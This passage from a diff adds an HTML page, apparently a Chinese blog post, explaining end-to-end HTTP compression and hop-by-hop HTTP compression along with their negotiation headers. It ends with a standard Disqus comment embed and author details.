+这个层面上的叫做端到端压缩(end-to-end compression),具体做法就是服务器压缩资源,等待浏览器接收然后才解压,传输过程中不进行任何解压和压缩.
+</p>
+
+<p>
+这个过程采用内容协商机制(proactive content negotiation),浏览器发送 <code>Accept-Encoding</code> 首部,包含它所支持的压缩算法以及使用优先级,服务器选择其中一种,并且通过 <code>Content-Encoding</code> 首部告诉浏览器选择的哪一种.
+</p>
+
+<p>
+服务器必须发送一个包含 <code>Accept-Encoding</code> 的 <code>Vary</code> 头来对资源进行不同形式的缓存.
+</p>
+
+
+<div class="figure">
+<p><img src="https://mdn.mozillademos.org/files/13811/HTTPCompression1.png" alt="HTTPCompression1.png">
+</p>
+<p><span class="figure-number">Figure 5: </span>端到端的压缩过程</p>
+</div>
+
+<ol class="org-ol">
+<li>节点之间的链路层面上的压缩</li>
+</ol>
+
+<p>
+逐跳压缩(Hop-by-hop compression),和端到端压缩类似,区别在于压缩发生在客户端与服务器中间的节点,不包括浏览器和服务器,比如缓存服务器,代理服务器等等.同样,这也需要进行内容协商.
+</p>
+
+<p>
+发送请求的接点需要发送 <code>TE</code> 头告诉响应节点支持哪种压缩算法,然后响应节点通过返回 <code>Transfer-Encoding</code> 头告诉请求节点选择了哪一种压缩算法.
+</p>
+
+
+<div class="figure">
+<p><img src="https://mdn.mozillademos.org/files/13809/HTTPComp2.png" alt="HTTPComp2.png">
+</p>
+<p><span class="figure-number">Figure 6: </span>逐跳的压缩过程</p>
+</div>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<div id="disqus_wrapper">
+    <div id="disqus_thread"></div>
+    <script>
+     /**
+      *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+      *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+     /*
+        var disqus_config = function () {
+        this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+      */
+     let disqus;
+     (function() { // DON'T EDIT BELOW THIS LINE
+         var d = document;
+         disqus = d.createElement('script');
+         disqus.async = true;
+         disqus.src = 'https://darksalt-me.disqus.com/embed.js';
+         disqus.setAttribute('data-timestamp', +new Date());
+         disqus.onload = function(){
+             console.log("Load disqus successfully.");
+         };
+         disqus.onerror = function(){
+             console.log("Load disqus failed.");
+         };
+         (d.head || d.body).appendChild(disqus);
+     })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+<p class="author">Author: saltb0rn (<a href="mailto:asche34@outlook.com">asche34@outlook.com</a>)</p>
+<p class="date">Date: 2019-01-04</p>
+<p class="creator">Generated by <a href="https://www.gnu.org/software/emacs/">Emacs</a> 27.0.50 (<a href="https://orgmode.org">Org</a> mode 9.2.1)</p>
+</div>
+</body>
+</html>
